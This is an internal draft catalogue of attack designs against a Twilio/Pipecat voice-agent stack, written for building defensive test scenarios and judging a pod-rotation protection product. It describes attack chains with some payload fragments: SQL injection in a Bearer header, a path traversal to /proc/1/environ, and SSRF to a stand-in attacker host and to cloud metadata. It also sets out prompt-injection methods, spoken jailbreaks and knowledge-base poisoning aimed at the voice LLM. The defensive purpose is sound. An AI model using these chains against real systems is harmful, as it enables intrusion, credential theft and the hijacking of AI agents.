# Voice-Agent Attack Catalogue — v1 (DRAFT)

**Target:** the Pipecat voice agent (Twilio phone → Deepgram STT → in-cluster litellm LLM w/ a Chroma retrieval tool → ElevenLabs TTS; transcripts saved to MongoDB; public FastAPI `/ws` ingress).
**Purpose:** realistic attacks to build as harness scenarios, each judged against **Phorvex = protection/prevention (continuous proactive motion), NOT detection.**
**How built:** a 12-agent workflow (per-service CVE scan + novel-attack discovery + toy-upgrade) → 55 raw findings → **26 deduped** → CVE-verification pass (19 IDs against NVD).
**Status: DRAFT.** These are attack *designs*, not built/tested scenarios. See §5 caveats.

---

## 1. Executive summary

- **26 realistic attacks**, all starting from *outside* (phone / public `/ws` / network / poisoned KB) — no "attacker already in the pod" assumptions.
- **The headline finding:** against this app, Phorvex's enabled actuator (pod rotation) is **never a full defense.**

  | Phorvex verdict | Count | Meaning |
  |---|---|---|
  | **R6CannotRespond** | **15** | motion cannot touch it (data-at-rest, one-shot/one-turn, static-cred theft, missing-auth-boundary) |
  | **R6Partial** | **11** | motion only *bounds* it (in-pod RCE footholds, availability, cred-reuse window) |
  | **R6Covers** | **0** | motion fully prevents it — **none** |

- **So the voice agent's real risks live largely *outside* what motion-based defense covers.** They need: **edge auth + rate-limiting** (the `/ws` / denial-of-wallet cluster), **data-layer controls** (encryption / auth / snapshots for Mongo & Chroma), **proactive credential rotation** (static SaaS/DB keys), and a **session-aware drain actuator** (rotating a live-call pod drops calls). Pod-rotation helps only the handful of in-pod RCE footholds.
- **CVE quality:** the workflow searched real databases — **0 fabricated CVEs** out of 19. Three were real CVEs mislabeled to the wrong product; corrected below (§4).
- **Origin mix:** 17 CVE-grounded · 4 OWASP-LLM · 3 novel (not in any CVE db) · 2 toy-upgrades.

---

## 2. Master table (all 26)

Priority = realism × how sharply it exercises a Phorvex gap. "Real fix" = the control that actually stops it.

| # | Attack | Origin | Pri | Phorvex | Real fix |
|--:|---|---|---|---|---|
| 1 | Direct `/ws` pipeline hijack (bypass Twilio, forged start frame) | novel¹ | High | CannotRespond | edge auth (verify `X-Twilio-Signature`/mTLS) |
| 2 | Forged `callSid` → operator-credentialed Twilio hang-up of live calls | CVE-2026-54695 | High | CannotRespond | request-authz (don't trust caller callSid) |
| 3 | Poisoned Chroma KB → indirect prompt injection to every caller | CVE-2026-45832/45831 + LLM01/04/08 | High | CannotRespond | data-layer (Chroma authn + corpus signing) |
| 4 | litellm pre-auth SQLi dumps provider/master keys + transcripts | CVE-2026-42208 | High | CannotRespond | patch + data-layer + network policy |
| 5 | litellm `api_base` SSRF steals upstream key (→ EKS IMDS) | CVE-2024-6587 | High | CannotRespond | patch + egress policy + IMDSv2 |
| 6 | MongoBleed: crafted-BSON heap disclosure leaks transcript PII | CVE-2025-14847 / CVE-2024-10921 | High | CannotRespond | patch + enable Mongo auth |
| 7 | Plaintext transcript exfil from no-auth Mongo | novel (`ai3`) | High | CannotRespond | data-layer (SCRAM + field encryption + DLP) |
| 8 | Live spoken prompt injection → sys-prompt/tool-schema leak, off-policy TTS | upgrade (`ai1`,LLM01/07) | High | CannotRespond | input/output guardrail tier |
| 9 | KB exfil over the phone via `search_knowledge_base` (no caller authz) | OWASP LLM02 | High | CannotRespond | caller authN + per-doc ACL + output DLP |
| 10 | pipecat runner `/files` path traversal → pod secrets + SA token | CVE-2026-44716 | High | Partial | disable runner `--folder` + proactive cred-rotate |
| 11 | Denial-of-wallet: `/ws` flood + silent holds burn STT/TTS/LLM | OWASP LLM10 | High | Partial | edge auth + rate-limit + concurrency cap |
| 12 | litellm SQLi→SSTI RCE (in-pod foothold on litellm) | CVE-2026-42208/42203 | High | Partial | patch; rotate bounds the foothold |
| 13 | Chroma `trust_remote_code` RCE on the KB server | CVE-2026-45833 | High | Partial | patch + Chroma authn; rotate bounds |
| 14 | One-packet unauth mongod crash (restart-vs-recrash) | CVE-2026-9740 | High | Partial | patch + enable auth; quarantine bounds |
| 15 | litellm data-plane implant (malicious route/callback on all LLM traffic) | CVE-2026-42208 | Med | CannotRespond | data-layer (config store integrity) |
| 16 | Twilio-webhook credential disclosure (unvalidated webhook) | analogous² (CVE-2026-4984) | Med | Partial | verify signature + proactive cred-rotate |
| 17 | Supply-chain: poisoned dep / Silero model → startup RCE → secret exfil | OWASP LLM03 | Med | CannotRespond | build-time (pinned digests, SBOM, offline models) |
| 18 | Forged `callSid` → Mongo transcript forgery/poisoning (stored injection) | novel (`ai2-memory`) | Med | CannotRespond | treat callSid as untrusted; write-auth; immutable records |
| 19 | Cross-tenant Chroma authz gap → full KB exfil | CVE-2026-45830 | Med | CannotRespond | patch (authz bypass — cred-rotate won't help) |
| 20 | Deepfake/voice-clone → password-reset flow (no caller auth) | novel | Med | CannotRespond | caller identity verification / step-up auth |
| 21 | Injection-forced expensive-turn amplification (tool-loop cost blow-up) | OWASP LLM10 | Med | Partial | per-call turn/token budget |
| 22 | **Rotation weaponized into availability drain** (motion-as-liability) | novel | Med | Partial | **session-aware drain actuator** + higher replica floor |
| 23 | Starlette multipart + python-multipart DoS (latent) | CVE-2025-54121 / CVE-2024-53981 | Med | Partial | bump deps + body-size cap |
| 24 | Injection-driven unbounded internal Chroma querying | upgrade (`ai2-agency`) | Low | Partial | per-call tool cap; quarantine bounds |
| 25 | Livekit pickle RCE over `/ws` (regression-guard, null on 0.0.94) | CVE-2025-62373 | Low | Partial | version pin (already patched) |
| 26 | h11 chunked-terminator request smuggling (latent config) | CVE-2025-43859 | Low | CannotRespond | keep httptools / bump h11 |

¹ Attack is real; the workflow's original CVE-2026-47212 label was wrong (that's a Symfony bug) — see §4. Root cause = same missing `/ws` auth as #2.
² CVE-2026-4984 is a real vuln *pattern* but NVD names no product (a third-party integration), so treat as analogous, not a stack CVE — see §4.

---

## 3. High-priority attacks — detail (build these first)

Each: **hits** / **from outside** / **chain** / **win** / **Phorvex**.

### H1 — Direct `/ws` pipeline hijack (bypass Twilio)  · novel · CannotRespond
- **Hits:** public `/ws` + the full STT→LLM→TTS pipeline + Mongo write.
- **From outside:** a raw WSS client over the internet — no phone, no Twilio, no signature.
- **Chain:** discover ingress host → open `wss://<host>/ws` (server `accept()`s with zero auth) → send forged `connected`+`start` frames with any SIDs → full Deepgram+litellm+ElevenLabs session runs → plaintext Mongo transcript written under the attacker's `call_sid`.
- **Win:** a pipeline session runs end-to-end with a transcript for a `call_sid` that has no matching Twilio call log and no signature ever presented.
- **Phorvex:** CANNOT TOUCH. The flaw is a *missing auth boundary in the code* (a static property), abused in one handshake (ms) — no intermediate step to reset, and every rotated replica ships the identical flaw. Fix = admission-time authz, not motion. **Sharpest realistic gap; the root enabler for #2 and #11.**

### H2 — Forged `callSid` → operator-credentialed hang-up  · CVE-2026-54695 · CannotRespond
- **Hits:** `TwilioFrameSerializer` auto-hangup (built with the operator Twilio token from pod env), via the unauth `/ws`.
- **From outside:** public `/ws`, caller-supplied `callSid` trusted verbatim.
- **Chain:** open `/ws` → send `start` with a live/enumerated victim `callSid` → serializer fires an authenticated Twilio REST `call.update(completed)` using *our* creds → victim's call force-dropped → loop over enumerated SIDs to mass-drop calls.
- **Win:** Twilio logs show an attacker-never-owned `callSid` hung up by an operator REST call, victim audio dropping.
- **Phorvex:** CANNOT TOUCH. Single request→request, no persistent asset. **Cred-rotate is a trap** — the attack abuses the server's *authorized* use of the current token; rotating just hands it a fresh valid token to hang up with. Fix = validate signature / stop trusting caller `callSid`.

### H3 — Poisoned Chroma KB → indirect injection  · CVE-2026-45832/45831 (+LLM01/04/08, ATLAS AML.T0051/T0070) · CannotRespond
- **Hits:** the shared `knowledge_base` Chroma collection (no-auth, on a PVC), read verbatim into the LLM tool channel.
- **From outside:** network write to the unauth Chroma `:8000` (flat cluster net / no NetworkPolicy), or an authz-bypass route, or a poisoned ingestion feed.
- **Chain:** reach Chroma `:8000` → upsert a poisoned doc (imperative "authority" text, or a dominant-embedding vector) or delete the collection → a later benign caller asks a covered question → `_retrieve` returns the poison as trusted tool output → the LLM obeys → ElevenLabs speaks the attacker's script; re-fires every future matching call.
- **Win:** a benign caller's TTS/transcript contains attacker-authored content in no system prompt or legit doc, AND the poisoned doc still returns at rest after Phorvex's window.
- **Phorvex:** CANNOT TOUCH — canonical data-plane gap. Poison is data-at-rest on Chroma's PVC in a namespace the voice policy doesn't even select; **rotating the bot makes the fresh pod re-query the same poison — motion re-arms the attack every tick.** Fix = data-layer (Chroma authn+NetworkPolicy, corpus signing/provenance, versioned restore).

### H4 — litellm pre-auth SQLi dumps keys + transcripts  · CVE-2026-42208 · CannotRespond
- **Hits:** litellm auth path (Bearer concatenated into an unparameterized SELECT) + its backing DB (provider keys, master/virtual keys, config, logs).
- **From outside:** any host that can route to litellm `:4000` — pre-auth (deploy uses `sk-noauth`).
- **Chain:** send `Authorization: Bearer ' UNION SELECT …` → injected query runs against litellm's DB → response returns upstream provider keys + master key + config → extend to read stored transcripts → replay static keys from anywhere.
- **Win:** response body contains plaintext provider/master keys that then authenticate from the attacker's own network.
- **Phorvex:** CANNOT TOUCH. Data-at-rest in a DB + static keys in a Secret — neither moves. One sub-second request; rotating litellm respawns it against the same DB with the same creds. litellm is also outside the voice selector, so nothing fires today. Fix = patch + parameterize + network policy + a real master key.

### H5 — litellm `api_base` SSRF steals upstream key (→ IMDS)  · CVE-2024-6587 · CannotRespond
- **From outside:** pod-network reach to the unauth litellm `:4000`.
- **Chain:** `POST /chat/completions` with `api_base=https://attacker` → litellm attaches its stored OpenAI `Authorization` and calls the attacker URL → attacker logs the provider key → escalate `api_base=http://169.254.169.254/…` to pull EKS IAM creds → replay off-cluster (OpenAI / ECR / S3).
- **Win:** attacker's server receives the real upstream key (or IMDS returns valid AWS creds) that then authenticate externally.
- **Phorvex:** CANNOT TOUCH — sub-second exfil of a static secret that doesn't live in any pod Phorvex moves. Fix = patch + block `api_base` override + egress policy + IMDSv2.

### H6 — MongoBleed heap disclosure leaks transcript PII  · CVE-2025-14847 / CVE-2024-10921 · CannotRespond
- **From outside:** the no-auth mongod wire port `:27017`, pre-auth.
- **Chain:** locate mongod → (optionally place a canary call) → send a crafted zlib `OP_MSG` / malformed BSON → server over-reads and returns uninitialized heap → repeat to harvest other callers' transcript text + PII.
- **Win:** response contains bytes the attacker never sent — the canary, another `call_sid`'s transcript, or PII.
- **Phorvex:** CANNOT TOUCH. One-shot unauth read (µs); rotate is useless on a stateful DB (PVC survives, fresh pod reloads the same data). Fix = patch to 7.0.28+ + enable auth + NetworkPolicy.

### H7 — Plaintext transcript exfil from no-auth Mongo  · novel (`ai3`) · CannotRespond
- **From outside:** network reach to `mongo.document-store.svc:27017` (authless) from an in-VPC/in-cluster position.
- **Chain:** gain any reach to `document-store` → connect unauthenticated → `db.transcripts.find({})` copies every call's plaintext transcript off-cluster.
- **Win:** the full transcripts collection is observed off-cluster AND the records still exist after the bot pod was demonstrably rotated (motion acted, changed nothing). *(This is the live demo we already ran.)*
- **Phorvex:** CANNOT TOUCH — canonical type-2. Data-at-rest outside the rotation target, survives even Mongo's own rotation (PVC re-mounts). Quarantine could *bound* an in-progress bulk dump but can't recover read records. Fix = SCRAM auth + field encryption + short-lived creds + egress DLP.

### H8 — Live spoken prompt injection → sys-prompt/tool leak  · upgrade (`ai1`,`ai2-sysprompt`; LLM01/07; ATLAS AML.T0054/T0056) · CannotRespond
- **From outside:** a phone call, or a direct unauth `/ws` — attacker speech becomes user turns with no guardrail.
- **Chain:** connect → speak a jailbreak (optionally spelled/phoneticized to survive STT + evade blocklists) → Deepgram transcribes verbatim into the LLM context with no guardrail tier → litellm emits the SYSTEM_PROMPT + tool schema, or off-policy content → ElevenLabs speaks it; written to the transcript.
- **Win:** within one call, the real TTS/transcript contains the verbatim system prompt, the tool schema, or an attacker-chosen phrase the base policy would never emit.
- **Phorvex:** CANNOT TOUCH. Completes inside one ~2–5s turn — a length-1 semantic chain, faster than any cadence; the per-call context is stateless so nothing persists to evict, and a fresh pod carries the same weak guard. Fix = input/output guardrails + prompt hardening (`guardrail-rotate` would be the matching actuator, but no guardrail tier is deployed).

### H9 — KB content exfil over the phone  · OWASP LLM02 (ATLAS AML.T0057) · CannotRespond
- **From outside:** a phone call (or unauth `/ws`) — pure natural language, zero caller auth.
- **Chain:** dial in → jailbreak into "verbatim mode" → issue broad enumerating queries ("list every internal procedure") → the LLM calls `search_knowledge_base` repeatedly; `_retrieve` returns raw text of any doc → the bot reads internal document text aloud.
- **Win:** TTS/transcript contains verbatim internal KB text (e.g. a seeded marker string) the caller was never meant to hear.
- **Phorvex:** CANNOT TOUCH. Single-turn read; docs sit on the Chroma PVC; no per-doc authz to enforce and nothing to reposition. Fix = caller authN + per-doc ACL/classification + output DLP + corpus minimization.

### H10 — pipecat runner `/files` path traversal → secrets + SA token  · CVE-2026-44716 · Partial
- **Precondition:** the dev runner started with `--folder` (confirm launch flags — else N/A).
- **From outside:** unauthenticated `GET /files/..%2F..%2F..%2Fproc/1/environ` → returns pod env (Twilio/Deepgram/ElevenLabs/litellm secrets); repeat for the K8s SA token → weaponize off-cluster.
- **Win:** an HTTP 200 returns `/proc/1/environ` (or a mounted secret / SA token) to an unauth remote client.
- **Phorvex:** BOUNDS the aftermath, can't prevent the read. The read is one-shot vs data-at-rest. **Phase 2 (reusing the stolen static cred) is where proactive cred/SA-token rotation shrinks the valid window** — *only if* secrets are actually rotated (today only rotate-pod is enabled). Fix = disable `--folder` / patch + proactive cred-rotate.

### H11 — Denial-of-wallet: `/ws` flood + silent holds  · OWASP LLM10 (ATLAS AML.T0034) · Partial
- **From outside:** mass concurrent unauth `/ws` connections — no phone, no Twilio.
- **Chain:** script N WSS connections each with a self-authored start frame → each spins a full metered Deepgram+litellm+ElevenLabs pipeline on our keys → stream trickle/sub-VAD-silence audio to keep sessions live (no max-duration/idle timeout) → scale to pin both replicas → third-party spend + concurrency climb until real callers are refused.
- **Win:** Deepgram/ElevenLabs/litellm cost spikes from sessions with no Twilio call records while replicas hit limits and real callers are dropped.
- **Phorvex:** BOUNDS pod-side blast (rotate respawns OOM'd replicas), can't prevent the wallet drain — the cadence has no term that throttles inbound connection rate, and the cost is at third-party APIs Phorvex can't move. Fix = edge auth + rate-limit + per-caller concurrency caps.

### H12 — litellm SQLi→SSTI RCE  · CVE-2026-42208 + CVE-2026-42203 · Partial
- **Chain:** `42208` pre-auth SQLi recovers the master key → authenticate → hit the template-render endpoint (`42203` SSTI) with an OS-command payload → RCE + reverse shell on the litellm pod → pivot to Chroma/Mongo, enumerate the SA token.
- **Win:** a reverse shell / command executes on the litellm pod (attacker's listener connects).
- **Phorvex:** BOUNDS — the one place motion genuinely bites. RCE = a persistent in-pod foothold (exec→persist→pivot), so periodic rotate resets it each cadence (the "rotate defends an in-pod foothold" win). Partial because `42208` already exfiltrated static keys first (rotate can't recover), a fast pivot within one interval matures, and litellm is outside the voice selector today.

### H13 — Chroma `trust_remote_code` RCE  · CVE-2026-45833 · Partial
- **Chain:** reach Chroma `:8000` (over-permissive/absent NetworkPolicy) → present any low-priv token (broken authz) → `POST` collection-update setting `embedding_function` to a malicious HF repo with `trust_remote_code=true` → Chroma executes attacker Python in-process → dump env + vector store → pivot.
- **Win:** attacker code runs on the Chroma pod (C2 callback / secret at attacker endpoint).
- **Phorvex:** BOUNDS. Single-POST RCE completes sub-second (motion can't prevent), but rotate evicts the implant and identity-rotate stales the SA token, capping dwell/lateral. Chroma is outside the voice selector today. Fix = patch + Chroma authn + NetworkPolicy.

### H14 — One-packet unauth mongod crash  · CVE-2026-9740 · Partial
- **Chain:** reach no-auth mongod `:27017` → send one crafted nested-BSON message → mongod crashes → re-send after each restart → sustained crash-loop → transcript writes fail.
- **Win:** mongod panics within moments; DB unreachable; re-crashes on each restart.
- **Phorvex:** BOUNDS availability. Rotate/restart restores it, but the one-packet chain re-completes instantly → rotation just feeds the crash-loop. **Quarantine (network-detach mongod) truly breaks it — but detaching the DB the bot writes to also degrades the app** (availability tradeoff). Fix = patch to 7.0.32+ + enable auth.

---

## 4. Medium / Low & notable calls

- **#15 litellm data-plane implant (CannotRespond):** with the master key (or `sk-noauth`), register a malicious model route/callback → all bot LLM traffic mirrored/rewritten; the poisoned config persists in litellm's DB and **survives rotation** (fresh pod reloads it). Data-layer only.
- **#22 Rotation weaponized into availability drain (Partial) — the sharpest *actuator-design* finding:** with only 2 replicas / `minAvailableReplicas 1` / `maxMovesPerTick 1`, an attacker holding both replicas with silent sessions turns Phorvex's own rotation into the DoS (rotate drops a busy replica's live calls). **Directly motivates a session-aware `drain`/reroute actuator + a higher replica floor.** Motion here is the liability, not the fix.
- **#20 Deepfake password-reset (CannotRespond):** the seeded KB literally advertises "say reset password"; no caller identity binding anywhere → any voice reaches the sensitive flow. Needs caller authN, not motion.
- **#17 Supply-chain (CannotRespond):** rotation is *counterproductive* — each respawn rebuilds from the same poisoned image / re-downloads the same model, reinfecting every tick. Build-time controls only.
- **#23/#25/#26 are latent/conditional:** #23 activates only once we add signature-checking (which introduces `request.form()`); #25 is null on 0.0.94 + TwilioFrameSerializer (regression guard); #26 needs a non-default h11 fallback. Track, don't build first.

---

## 5. CVE verification & corrections (applied above)

19 CVE IDs checked against NVD: **17 real-and-match, 2 misattributed, 0 fabricated.** Corrections folded in:

| Original label | Problem | Resolution |
|---|---|---|
| `CVE-2026-47212` (#1) | Real CVE but it's a **Symfony** bug, not Pipecat | Relabeled #1 as **novel**; root cause = same missing `/ws` auth as `CVE-2026-54695` (#2). |
| `CVE-2026-29606` (#18) | Real CVE but it's **OpenClaw**, different mechanism | Dropped the CVE; #18 stands as **novel** (forged callSid → Mongo write). |
| `CVE-2026-4984` (#16) | Real vuln *pattern* but NVD names **no product** | Reclassified #16 as **analogous pattern**, not a stack CVE. Precondition (missing signature) still present, so still worth testing. |

All other CVEs (litellm `42208`/`42203`/`6587`, Chroma `45832/45831/45833/45830`, Mongo `14847`/`10921`/`9740`, Starlette `54121`, python-multipart `53981`, h11 `43859`, Pipecat `54695`/`62373`/`44716`) verified real and matched to our exact versions.

---

## 6. Scope & caveats (why this is a DRAFT, not final)

1. **Designs, not code.** Nothing here is a built/tested harness scenario yet. "Realistic" is achieved in the build phase (rewriting the Go to hit real targets), not by this document.
2. **The old ~59-file catalogue is untouched.** ~10 voice-relevant toys were absorbed here as realistic designs (the `upgrade` entries + folded `source_id`s); the other ~49 are generic k8s/GPU/MCP/model-registry scenarios for other workloads and out of scope for this effort.
3. **Some entries are latent/conditional** (#10 needs `--folder`; #23/#25/#26 config-dependent) — labeled inline.
4. **Phorvex verdicts assume the current deployment** (rotate-only policy, voice ns only, litellm/Chroma/Mongo outside the voice selector). Several "nothing fires today" notes stem from that config, not from the attack being harmless.

## 7. Recommended build order

1. **#7 transcript exfil** — already demoed live; fastest to codify as the first real scenario.
2. **#1 / #2 the `/ws` gap** — the sharpest realistic, citable (CVE-2026-54695) attack.
3. **#8 spoken prompt injection** — the most AI-native, maps to the `ai1` toy upgrade.
4. **#3 Chroma poisoning** & **#11 denial-of-wallet** — the two other high-value gaps.

Everything above is derived; the actuator gaps it exposes (proactive cred-rotate, data-layer, session-drain, edge auth) are the input to the *next* question: which new actuators Phorvex needs.

---

## 8. 2026 framework refresh — +5 pickups (catalogue → 32)

Re-checked the frameworks: **MITRE ATLAS v5.4.0** (+ agent family `AML.T0080–T0086`, Oct 2025) and **OWASP** (**LLM Top-10 2026**; new **Agentic Top-10 `ASI01–10`** + `T1–T15` taxonomy). The new material is almost all **agentic / voice-conversation / telephony-identity** — the class the original 27 underweighted. All 5 are `R6CannotRespond` (semantic / telephony / one-shot — pod-rotation can't touch them).

| # | Attack | Framework IDs | What it does |
|--:|---|---|---|
| 28 | **Barge-in / interruption injection ("TEAPOT")** | `ASI01` · `AML.T0053` · `LLM01:2026` | Interrupt the bot mid-reply so the injected instruction lands while context is half-built → unauthorized/mis-parameterized tool calls. No text-chat equivalent. |
| 29 | **Agent-config / hidden-context recon** | `AML.T0084` / `T0069` · `LLM08:2026` | Probe by voice to fingerprint the tool, its trigger phrases, and the hidden RAG schema/policy *before* attacking. |
| 30 | **RAG credential harvesting** | `AML.T0082` · `LLM02:2026` | Coax the bot into reading out credentials that leaked into the knowledge base (distinct from dumping docs). |
| 31 | **Caller-ID / ANI spoofing** | `T9` / `ASI03` | Spoof the phone number to beat "known caller" trust; supercharges the deepfake reset (#B3). |
| 32 | **Human manipulation of callers** | `T15` / `ASI09` · `LLM07:2026` | Weaponize the *trusted* bot (via injection or poisoned KB) to socially-engineer its own callers. Harm flows outward. |

**Explicitly N/A (excluded so no one wastes a sprint):** ultrasonic voice commands (**DolphinAttack / NUIT**) — the bot has no microphone and the telephony codec strips >20 kHz; **DTMF injection** — the bot gathers no touch-tones.

**Watch / conditional:** homophone/transcription-layer guardrail evasion (`AML.T0068`, latent — no guardrail exists yet); transcript→RAG memory-poisoning loop (`AML.T0080.000`, N/A until transcripts are re-ingested); codec-robust adversarial audio (`CodecAttack`, emerging).

**Re-tags on the existing 27** (modern IDs, no new attacks): B1→`ASI01`/`AML.T0053`; B2→`ASI02`/`AML.T0085.001`; B13→`ASI06`/`AML.T0080`; B4/B5→`LLM06:2026`/`AML.T0034.002`; the retrieval tool → `LLM03:2026` (Excessive Agency, ↑#3); B20→`ASI04`/`AML.T0011.002`.

**Verification note:** OWASP `ASI01–10`, `T1–T15`, and the `LLM08:2026` rename are confirmed against the OWASP repo/multiple sources. The ATLAS agent-era IDs (`T0080–T0086`, `T0011.002`) were cross-checked vs ATLAS's GitHub data + the co-authors' writeup, but the live atlas.mitre.org pages render via JS — confirm exact names there before the boss deck.
